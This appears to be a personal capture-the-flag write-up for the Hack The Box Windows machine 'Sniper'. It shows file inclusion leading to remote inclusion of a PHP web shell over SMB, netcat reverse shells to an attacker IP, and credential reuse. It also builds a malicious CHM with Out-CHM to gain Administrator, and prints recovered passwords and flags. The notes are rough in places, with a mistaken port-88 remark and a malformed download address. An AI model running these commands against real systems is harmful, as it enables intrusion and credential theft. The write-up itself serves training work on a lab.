## Intro


Tags: #windows #NotAssumedBreach #WebApp  #RFI #OSCPpath #medium 

-----
# Reconnaissance

## Add target to hosts
```shell
echo '10.129.229.6 sniper.htb' | sudo tee -a /etc/hosts
```
## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n sniper.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 13:08 -0400                                                                          
Nmap scan report for sniper.htb (10.129.229.6)                                                                                             
Host is up (0.048s latency).                                                                                                               
Not shown: 65530 filtered tcp ports (no-response)                                                                                          
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds

```
the target appears to be a dc, one indicator is port 88 being open
### Scan specific open TCP ports
```shell
sudo nmap -p80,135,139,445,49667 -A sniper.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-29 13:13 -0400
Nmap scan report for sniper.htb (10.129.229.6)
Host is up (0.049s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m53s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-30T00:14:13
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.52 ms 10.10.14.1
2   51.46 ms sniper.htb (10.129.229.6)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.93 seconds
```


```
http://sniper.htb
```
![](MediaFiles/Pasted%20image%2020260429201734.png)

From all those, only the bottom 2 are going somehwere

## Web app inspection

### Login page

 `User Portal` goes to a login page:
```
http://sniper.htb/user/login.php
```
![](MediaFiles/Pasted%20image%2020260429201921.png)
when typing admin:admin the page "refreshes" and shows an incorrect login message
![](MediaFiles/Pasted%20image%2020260429202025.png)

page source here showed nothing valuable

From this page, we can also reach `Sign Up` page
```
http://sniper.htb/user/login.php
```
![](MediaFiles/Pasted%20image%2020260429202128.png)
Then i created a registered a user and logged in. After logging in, was redirected to this page:
![](MediaFiles/Pasted%20image%2020260429202939.png)where it loads forever and nothing else happens

### Our services page

First `Our services` goes to
```
http://sniper.htb/blog/index.php
```
![](MediaFiles/Pasted%20image%2020260429201848.png)
here i noticed sth interesting tho, when clicking `Language`, the url becomes
```
http://sniper.htb/blog/?lang=blog-en.php
```

#### File inclusion

that a format that could indicate File inclusion, so lets test thats the case here:
```
http://sniper.htb/blog/?lang=/windows/win.ini
```
then view page source:
![](MediaFiles/Pasted%20image%2020260429203417.png)
and it worked:
```html

</html>
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
</body>
</html>	
```
lets do this for more windows files, like `windows/system32/drivers/etc/hosts`
```
http://sniper.htb/blog/?lang=/windows/system32/drivers/etc/hosts
```
content:
```html
</html>
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
</body>
</html>	
```

### RFI via smb

#### verify

Now, since file inclusion is confirmed, we can check if remote file inclusion is also possible.
Lets check if the machine can fetch a file in the network

First lets set netcat to listen on port 445
```
nc -nvlp 445
```

And we will send a request to out IP and try to grab some gibberish. We will be setting the parameter as **_\\10.10.14.5\ch3ckm8.txt_**. ch3ckm8.txt doesn’t exist, so there will be a 404 error, and if everything goes fine, we will get a connection in netcat.
```
\\10.10.14.217\ch3ckm8.txt
```

#### confirmed
and received connection back to our listener!
```shell
└─$ nc -nvlp 445                                                                                                                           
listening on [any] 445 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.229.6] 49694
E�SMBr▒S�����"NT LM 0.12SMB 2.002SMB 2.???^X@sS
```

### Exploit


#### Creating an smb server
Now, we can check if our file is actually being fetched or not, by creating a smb server and then moving on to the fetch the file.

For that we need to modify the smb.conf file. 

```
sudo mousepad /etc/samba/smb.conf
```

```
[htb]
path = /home/ch3ckm8/HTB/sniper
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```
then go to specified directory `/home/ch3ckm8/HTB/sniper` and type
```
chmod 0555 /home/ch3ckm8/HTB/sniper
sudo chown -R nobody:nogroup /home/ch3ckm8/HTB/sniper
```

restart smb server:
```
sudo service smbd restart
```
lets check status
```shell
└─$ sudo systemctl status smbd                                                                                                             
● smbd.service - Samba SMB Daemon
     Loaded: loaded (/usr/lib/systemd/system/smbd.service; disabled; preset: disabled)
     Active: active (running) since Wed 2026-04-29 13:51:55 EDT; 7min ago
 Invocation: 0d98a3978a1a422b9d9e39c1f41a4560
       Docs: man:smbd(8)
             man:samba(7)
             man:smb.conf(5)
    Process: 584852 ExecCondition=/usr/share/samba/is-configured smb (code=exited, status=0/SUCCESS)
    Process: 584856 ExecStartPre=/usr/share/samba/update-apparmor-samba-profile (code=exited, status=0/SUCCESS)
   Main PID: 584866 (smbd)
     Status: "smbd: ready to serve connections..."
      Tasks: 3 (limit: 12323)
     Memory: 8.1M (peak: 32.7M)
        CPU: 1.256s
     CGroup: /system.slice/smbd.service
             ├─584866 /usr/sbin/smbd --foreground --no-process-group
             ├─584869 "smbd: notifyd" .
             └─584870 "smbd: cleanupd "

Apr 29 13:51:55 kali systemd[1]: Starting smbd.service - Samba SMB Daemon...
Apr 29 13:51:55 kali systemd[1]: Started smbd.service - Samba SMB Daemon.
Apr 29 13:51:58 kali smbd[584911]: pam_unix(samba:session): session closed for user nobody
Apr 29 13:58:08 kali smbd[588318]: pam_unix(samba:session): session closed for user nobody
Apr 29 13:58:08 kali smbd[588318]: pam_unix(samba:session): session closed for user nobody


```

verify smb server is running:
```
smbmap -H 10.10.14.217
```

```shell
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.14.217:445        Name: 10.10.14.217              Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        htb                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.23.6-Debian-4.23.6+dfsg-1+b1)
        nobody                                                  NO ACCESS       Home Directories
[*] Closed 1 connections                                                                               
```
did not work at first, then did this
```
# Check parent directory permissions
ls -la /home/ch3ckm8/HTB/

# The 'sniper' folder needs execute permission on parent directories for 'nobody' to traverse

# Fix parent directory traversal
chmod 755 /home/ch3ckm8
chmod 755 /home/ch3ckm8/HTB
```
and then rerunning the smbmap command it showed `READ ONLY` on the share we wanted `htb`:
```shell
└─$ smbmap -H 10.10.14.217                                                                                                                 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.14.217:445        Name: 10.10.14.217              Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        htb                                                     READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.23.6-Debian-4.23.6+dfsg-1+b1)
        nobody                                                  NO ACCESS       Home Directories
[*] Closed 1 connections                                                                
```

### RCE

We will now create a file in our directory to create a php file, to perform RCE.
start listener
```shell
nc -nvlp 3333
```
#### verify
```
http://sniper.htb/blog/?lang=\\10.10.14.217\htb\web.php&cmd=whoami
```

request
```powershell
GET /blog/?lang=\\10.10.14.217\htb\web.php&cmd=whoami HTTP/1.1

Host: sniper.htb

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Connection: keep-alive
```

#### confirmed
response
```powershell
<html>
<body>
<form method="GET" name="index.php">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
nt authority\iusr

</pre>
</body>
</html>
</body>
</html>
```
great! it worked, it showed us that we are `nt authority\iusr`

checking also language mode
```powershell
cmd=Powershell+$executionContext.SessionState.LanguageMode
```
request
```powershell
GET /blog/?lang=\\10.10.14.217\htb\web.php&cmd=Powershell+$executionContext.SessionState.LanguageMode HTTP/1.1

Host: sniper.htb

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Connection: keep-alive
```
response
```powershell
<html>
<body>
<form method="GET" name="index.php">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
FullLanguage

</pre>
</body>
</html>
</body>
</html>
```
so we have `Full language`, lets upload nc.exe
copy nc.exe to our the share we have opened 
```shell
sudo cp /usr/share/windows-resources/binaries/nc.exe /home/ch3ckm8/HTB/sniper
```
then get it
```shell
rlwrap nc -lnvp 8001
```

```powershell
\\10.10.14.217\htb\web.php&cmd=\\10.10.14.217\htb\nc.exe 10.10.14.217 5555 -e powershell
```
so encoded it becomes
```powershell
\\10.10.14.217\htb\web.php&cmd=\\10.10.14.217\htb\nc.exe%2010.10.14.217%205555%20-e%20powershell
```
request
```powershell
GET /blog/?lang=\\10.10.14.217\htb\web.php&cmd=\\10.10.14.217\htb\nc.exe%2010.10.14.217%205555%20-e%20powershell HTTP/1.1

Host: sniper.htb

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Encoding: gzip, deflate

Connection: keep-alive
```

```powershell
curl 'http://sniper.htb/blog/?lang=\\10.10.14.217\htb\web.php&cmd=\\10.10.14.217\htb\nc.exe%2010.10.14.217%205555%20-e%20powershell'
```
### Shell as nt authority\iusr

```powershell
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.229.6] 49730
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog> whoami
whoami
nt authority\iusr
PS C:\inetpub\wwwroot\blog> 
```

### Filesystem enumeration

After searching multiple files, i stumbled upon this one, which contained creds
```powershell
PS C:\inetpub\wwwroot\user> type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```
#### creds obtained
```
dbuser
36mEAhz/B8xQ~2VM
```
but where can we use these creds? lets find out

### Finding valid users

```powershell
net user

----------------------------------------------------
Administrator            Chris                    DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed with one or more errors.
```

### Checking Password reuse

lets try to use those creds for chris
```shell
nxc smb sniper.htb -u chris -p '36mEAhz/B8xQ~2VM'
```
#### confirmed
```shell
SMB         10.129.229.6    445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:None)
SMB         10.129.229.6    445    SNIPER           [+] Sniper\chris:36mEAhz/B8xQ~2VM 
```
nice, this means we can login via smb as user chris with this pass

### Change user via powershell remoting

Now, lets do powershell remoting and get a shell as chris
set creds as variable:
```powershell
$cred = New-Object System.Management.Automation.PSCredential("SNIPER\Chris", (ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force))
```
verify
```powershell
Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {whoami}
```
works!
```powershell
PS C:\inetpub\wwwroot\blog> Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {whoami}
Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {whoami}
sniper\chris

PS C:\inetpub\wwwroot\blog> 
```
Now that we confirmed we are chris, lets do sth similar with what we did for initial access, by using the netcat located in our share
```powershell
Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {\\10.10.14.217\htb\nc.exe 10.10.14.217 7777 -e powershell}
```
## Shell as user (chris)
```powershell
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.229.6] 49738
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Chris\Documents> whoami
whoami
sniper\chris
PS C:\Users\Chris\Documents> type ../Desktop/user.txt
type ../Desktop/user.txt
1d82f4b54db9273b475a65d853da0553
```

--------
# Privesc

## Filesystem enumeration

### Search directories recursively

#### Non systemic file found
```powershell
PS C:\Users\Chris> gci -recurse
gci -recurse


    Directory: C:\Users\Chris


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        4/11/2019   7:04 AM                3D Objects                                                            
d-r---        4/11/2019   7:04 AM                Contacts                                                              
d-r---        4/11/2019   8:15 AM                Desktop                                                               
d-r---        4/11/2019   7:04 AM                Documents                                                             
d-r---        4/11/2019   8:36 AM                Downloads                                                             
d-r---        4/11/2019   7:04 AM                Favorites                                                             
d-r---        4/11/2019   7:04 AM                Links                                                                 
d-r---        4/11/2019   7:04 AM                Music                                                                 
d-r---        4/11/2019   7:04 AM                Pictures                                                              
d-r---        4/11/2019   7:04 AM                Saved Games                                                           
d-r---        4/11/2019   7:04 AM                Searches                                                              
d-r---        4/11/2019   7:04 AM                Videos                                                                


    Directory: C:\Users\Chris\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        4/29/2026   5:07 PM             34 user.txt                                                              


    Directory: C:\Users\Chris\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/11/2019   8:36 AM          10462 instructions.chm                                                      


    Directory: C:\Users\Chris\Favorites


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        4/11/2019   7:04 AM                Links                                                                 
-a----        4/11/2019   7:04 AM            208 Bing.url                                                              


    Directory: C:\Users\Chris\Links


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/11/2019   7:04 AM            494 Desktop.lnk                                                           
-a----        4/11/2019   7:04 AM            939 Downloads.lnk                                                         
```
found `instructions.chm` on Downloads

#### Hint found

also:
```powershell
PS C:\Docs> type note.txt
type note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

```
We can try and create a malicious chm and later use that to get a reverse-shell.

### Exploiting chm file

first transfer netcat
```powershell
Invoke-Command -Session $session -Scriptblock {wget 10.10.14.2178000/ncat.exe -outfile C:\.enum\ncat.exe}
```

add this at the end
https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1
this outputs a malicious .chm

on any windows host
```powershell 
powershell -ep bypass
```
then import module
```powershell
Import-Module .\Out-CHM.ps1
```

```powershell
Out-CHM -Payload "cp C:\Users\Administrator\Desktop\root.txt C:\tmp\root.txt" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

```powershell
Out-CHM -Payload "C:\Docs\nc.exe -e powershell 10.10.14.217 6666" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

```powershell
Out-CHM -Payload "C:\Users\Chris\Downloads\nc.exe -e cmd.exe 10.10.14.217 6655" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

```powershell
copy \\10.10.14.217\HTB\nc.exe .
```

```powershell
Copy-Item -Path "\\10.10.14.217\htb\nc.exe" -Destination "C:\Docs\nc.exe" -Force
```

```powershell
Copy-Item -Path "\\10.10.14.217\HTB\instructions.chm" -Destination "C:\Docs\instructions.chm" -Force
```

```powershell
copy \\10.10.14.217\HTB\instructions.chm .
```

```powershell
Invoke-WebRequest "http://10.10.14.217:8001/doc.chm" -Outfile c:\Docs\doc.chm
```

```powershell
Invoke-WebRequest "http://10.10.14.217:8001/project.chm" -Outfile c:\Docs\project.chm
```

```powershell
wget http://10.10.14.217:8001/instructions.chm -o C:\Users\chris\instructions.chm
```

#### creds obtained
```
Administrator
butterfly!#1
```

### Change user via powershell remoting

```powershell
$cred = New-Object System.Management.Automation.PSCredential("SNIPER\Administrator", (ConvertTo-SecureString "butterfly!#1" -AsPlainText -Force))
```

```powershell
Invoke-Command -ComputerName SNIPER -Credential $cred -ScriptBlock {C:\Users\Chris\Downloads\nc.exe 10.10.14.217 7778 -e powershell}
```

## Shell as administrator
```powershell
└──╼ [★]$ nc -lvnp 7778
listening on [any] 7778 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.229.6] 49700
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents> whoami
whoami
sniper\administrator
PS C:\Users\Administrator\Documents> cd ..
cd ..
PS C:\Users\Administrator> cd DeSKTOP
cd DeSKTOP
PS C:\Users\Administrator\DeSKTOP> dir
dir


    Directory: C:\Users\Administrator\DeSKTOP


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        4/29/2026  10:49 PM             34 root.txt                                                              


PS C:\Users\Administrator\DeSKTOP> type root.txt
type root.txt
ded5238c992e10c0db7d5ffd3a57e335
PS C:\Users\Administrator\DeSKTOP> 
```

----
# Summary

todo wyrmgaze



----
# Sidenotes
